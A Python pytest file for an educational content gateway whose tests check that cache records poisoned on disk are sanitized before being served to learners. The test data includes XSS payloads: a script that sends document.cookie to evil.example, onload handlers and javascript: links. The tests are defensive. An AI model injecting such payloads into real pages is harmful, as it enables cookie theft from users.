"""FIX 7 — the gates run on the SERVE path, not only on generation.

Wave-30 evidence (`wave30-content-reports/physchem-engineering.md` §5, `social-eng.md` §3): a
cache record poisoned on disk with `<script>`, `onload=` and a `javascript:` href was served
back **verbatim**, `status: canonical`, in 3.8-56.5 ms for $0.00 — eleven of eleven injected
defects reached the learner. `sanitize` and `lint` live inside generation and inside
`validate_and_promote`; `_public()` hands a cached record straight out.

These tests read a poisoned record the way a learner's request does, and require that what
comes back does not contain the poison.
"""

from __future__ import annotations

import json

import pytest
from wobo_gateway.app import CapabilityRequest, Gateway
from wobo_gateway.cache import InMemoryCache
from wobo_gateway.plexus import store
from wobo_gateway.providers import MockProvider
from wobo_gateway.registry import ConsentTier
from wobo_gateway.telemetry import MetricsSink

TEST_SUBJECT = "cache-read-learner"


@pytest.fixture(autouse=True)
def cache_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("PLEXUS_CACHE_DIR", str(tmp_path))
    monkeypatch.delenv("GEMINI_API_KEY", raising=False)
    monkeypatch.delenv("GOOGLE_AI_API_KEY", raising=False)
    return tmp_path


def invoke(capability: str, **payload: object):
    gw = Gateway(MockProvider(), InMemoryCache(), MetricsSink())
    return gw.invoke(
        capability,
        CapabilityRequest(consent_tier=ConsentTier.UN_ELEVATED, payload=dict(payload)),
        subject=TEST_SUBJECT,
    )


def _poison_on_disk(concept: str, modality: str, mutate) -> dict:
    """Rewrite the cached record's artifact the way an attacker with the cache would."""
    path = store.artifact_path(concept, modality, "core")
    record = json.loads(path.read_text())
    record["artifact"] = mutate(record["artifact"])
    path.write_text(json.dumps(record))
    return record


# --- the sanitizer's rules, run as a DETECTOR ------------------------------------------


def test_svg_violations_names_what_the_sanitizer_would_strip() -> None:
    from wobo_gateway.plexus.sanitize import svg_violations

    clean = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect x="1"/></svg>'
    assert svg_violations(clean) == []

    dirty = (
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
        '<script>fetch("https://evil.example/?c="+document.cookie)</script>'
        '<rect x="1" onload="alert(1)"/>'
        '<a href="javascript:alert(1)"><text>tap</text></a>'
        "</svg>"
    )
    reasons = " ".join(svg_violations(dirty))
    assert "script" in reasons
    assert "onload" in reasons
    assert "href" in reasons

    # unparseable / not an SVG at all is a refusal too, not a silent pass
    assert svg_violations("<b>not an svg</b>") != []


# --- the serve path ---------------------------------------------------------------------


def test_a_poisoned_diagram_is_refused_on_the_cache_read() -> None:
    invoke("engine.diagram", concept="the water cycle")

    payload = (
        '<script>fetch("https://evil.example/?c="+document.cookie)</script>'
        '<rect x="1" y="1" width="2" height="2" onload="alert(1)"/>'
        '<a href="javascript:alert(1)"><text x="1" y="9">tap</text></a>'
    )
    _poison_on_disk(
        "the water cycle", "diagram", lambda svg: svg.replace("</svg>", payload + "</svg>")
    )

    served = invoke("engine.diagram", concept="the water cycle").output["artifact"]
    assert "<script" not in served
    assert "document.cookie" not in served
    assert "onload" not in served
    assert "javascript:" not in served


def test_a_poisoned_video_scene_is_refused_on_the_cache_read() -> None:
    invoke("engine.video", concept="the water cycle")

    def mutate(artifact: dict) -> dict:
        scene = artifact["scenes"][0]
        scene["visual"]["payload"] = scene["visual"]["payload"].replace(
            "</svg>", "<script>document.cookie</script></svg>"
        )
        return artifact

    _poison_on_disk("the water cycle", "video", mutate)
    served = invoke("engine.video", concept="the water cycle").output["artifact"]
    assert "<script" not in json.dumps(served)


def test_a_cached_record_that_fails_lint_is_refused_on_the_cache_read() -> None:
    """Not only XSS: an artifact the deterministic lint proves BROKEN must not serve either.

    `interaction.kind: "wiggle"` is outside the client's vocabulary — the card renders dead.
    """
    invoke("engine.compose", concept="the water cycle")

    def mutate(artifact: dict) -> dict:
        artifact["cards"][0]["interaction"] = {"kind": "wiggle", "prompt": "wiggle it"}
        return artifact

    _poison_on_disk("the water cycle", "compose", mutate)
    served = invoke("engine.compose", concept="the water cycle").output["artifact"]
    kinds = [
        (c.get("interaction") or {}).get("kind") for c in served["cards"] if isinstance(c, dict)
    ]
    assert "wiggle" not in kinds


# --- and the recheck must not cost a clean cache its hit --------------------------------


@pytest.mark.parametrize(
    "capability", ["engine.compose", "engine.simulate", "engine.diagram", "engine.video"]
)
def test_a_clean_cached_artifact_still_serves_from_cache(capability: str) -> None:
    first = invoke(capability, concept="the water cycle")
    second = invoke(capability, concept="the water cycle")
    assert second.tokens == 0, "an untouched cache record must still be a free hit"
    assert first.output == second.output
